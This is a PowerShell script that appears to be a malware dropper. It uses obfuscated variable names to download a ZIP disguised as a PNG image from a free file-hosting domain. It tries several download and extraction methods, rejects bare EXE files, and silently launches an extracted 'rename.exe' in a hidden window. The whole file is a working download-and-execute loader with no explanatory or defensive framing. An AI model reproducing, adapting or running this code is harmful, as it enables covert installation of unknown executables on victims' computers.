$GXjAo = "https://file.freestorage-04.bond/files/2026/10/5/cd2f3fb9-6c80-4243-9429-d54e87a931f6/haha.png?srl=II-DSBd1GW9Cp8UHWbh2NQ&exp=1791247315"
$yyAa = [System.IO.Path]::GetRandomFileName().Replace('.','')
$mFiU = [System.IO.Path]::GetTempPath()
$g0WvmJjG = Join-Path $mFiU ("$yyAa" + ".zip")
$w2H7 = Join-Path $mFiU $yyAa
$VQ2WO6QD = "rename.exe"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch { }

function _spreadStop {
    param([string]$pFjBdKnb)
    Write-Host ('[Spread] ' + $pFjBdKnb) -ForegroundColor Red
    try {
        if ($Host.Name -eq 'ConsoleHost' -and [Environment]::UserInteractive) {
            Read-Host 'Press Enter to exit'
        } else {
            Start-Sleep -Seconds 8
        }
    } catch {
        Start-Sleep -Seconds 8
    }
    exit 1
}

if (Test-Path -LiteralPath $w2H7) {
    Remove-Item -LiteralPath $w2H7 -Recurse -Force -ErrorAction SilentlyContinue
}

$ORmB4NUv = $false
try {
    Start-BitsTransfer -Source $GXjAo -Destination $g0WvmJjG -ErrorAction Stop
    $ORmB4NUv = $true
} catch { }
if (-not $ORmB4NUv) {
    try {
        (New-Object Net.WebClient).DownloadFile($GXjAo, $g0WvmJjG)
        $ORmB4NUv = $true
    } catch { }
}
if (-not $ORmB4NUv) {
    try {
        Invoke-WebRequest -Uri $GXjAo -OutFile $g0WvmJjG -UseBasicParsing
        $ORmB4NUv = $true
    } catch {
        _spreadStop 'All download methods failed (BITS / WebClient / Invoke-WebRequest).'
    }
}

if (-not (Test-Path -LiteralPath $g0WvmJjG)) {
    _spreadStop 'ZIP was not saved to temp — check URL, firewall, TLS.'
}
$Z5nvG5P = [IO.File]::ReadAllBytes($g0WvmJjG)
if ($Z5nvG5P.Length -ge 4 -and $Z5nvG5P[0] -eq 0x4D -and $Z5nvG5P[1] -eq 0x5A) {
    _spreadStop ('Downloaded file is an EXE (MZ...), not a ZIP. First bytes: {0:X2} {1:X2} {2:X2} {3:X2}' -f $Z5nvG5P[0], $Z5nvG5P[1], $Z5nvG5P[2], $Z5nvG5P[3])
}
if ($Z5nvG5P.Length -lt 4 -or $Z5nvG5P[0] -ne 0x50 -or $Z5nvG5P[1] -ne 0x4B) {
    _spreadStop ('Not a ZIP (bad file or block). First bytes: {0:X2} {1:X2} {2:X2} {3:X2}' -f $Z5nvG5P[0], $Z5nvG5P[1], $Z5nvG5P[2], $Z5nvG5P[3])
}

$sLPMmq = $false
try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
    [System.IO.Compression.ZipFile]::ExtractToDirectory($g0WvmJjG, $w2H7)
    $sLPMmq = $true
} catch { }
if (-not $sLPMmq) {
    try {
        if (Test-Path -LiteralPath $w2H7) {
            Remove-Item -LiteralPath $w2H7 -Recurse -Force -ErrorAction SilentlyContinue
        }
        Expand-Archive -LiteralPath $g0WvmJjG -DestinationPath $w2H7 -Force
        $sLPMmq = $true
    } catch { }
}
if (-not $sLPMmq) {
    try {
        if (Test-Path -LiteralPath $w2H7) {
            Remove-Item -LiteralPath $w2H7 -Recurse -Force -ErrorAction SilentlyContinue
        }
        New-Item -ItemType Directory -Path $w2H7 -Force | Out-Null
        $LJNwFL = New-Object -ComObject Shell.Application
        $o8c2tWP = $LJNwFL.NameSpace((Resolve-Path $g0WvmJjG).Path)
        $Zr2jCM = $LJNwFL.NameSpace((Resolve-Path $w2H7).Path)
        $Zr2jCM.CopyHere($o8c2tWP.Items(), 0x14)
        $u84lginr = 120
        $idJAL = 0
        while ($idJAL -lt $u84lginr -and -not (Test-Path -LiteralPath (Join-Path $w2H7 $VQ2WO6QD))) {
            Start-Sleep -Milliseconds 500
            $idJAL++
        }
        if (Test-Path -LiteralPath (Join-Path $w2H7 $VQ2WO6QD)) { $sLPMmq = $true }
    } catch { }
}
if (-not $sLPMmq) {
    _spreadStop 'Could not unzip (ZipFile / Expand-Archive / Shell all failed).'
}

$O9rdApfa = Join-Path $w2H7 $VQ2WO6QD
if (-not (Test-Path -LiteralPath $O9rdApfa)) {
    _spreadStop ('EXE not found: ' + $O9rdApfa)
}

$QT4F = (Get-Location).Path
Set-Location -LiteralPath $w2H7
try {
    $DTt0Oi = Start-Process -FilePath $O9rdApfa -WindowStyle Hidden -PassThru
} catch {
    _spreadStop ('Could not start rename.exe: ' + $_.Exception.Message)
} finally {
    if ($QT4F) { Set-Location -LiteralPath $QT4F }
}
